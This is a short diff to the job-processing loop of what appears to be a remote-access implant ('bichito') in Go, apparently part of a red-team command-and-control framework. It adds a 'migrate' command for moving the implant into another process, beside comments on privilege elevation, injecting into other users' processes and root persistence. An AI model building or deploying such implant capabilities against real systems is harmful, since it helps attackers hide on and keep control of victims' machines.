@@ -226,10 +226,19 @@ func jobProcessor(){
 					}
 		   			contChannel <- "continue"
 
-		   		//Elevate
+		   		//Elevate Privileges
 
 		   		//SYSTEM Actions
+		   		
+
 		   		//Inject other user process, root persistence,...
+		   		case "migrate":
+
+		   			error,result = biterpreter.Migrate(job.Parameters)
+		   			if error{
+						result = "Error Migrating bichito:"+ result
+					}
+		   			contChannel <- "continue"
 
 		   		default:
 		   			result = "Void No Job Inplemented"
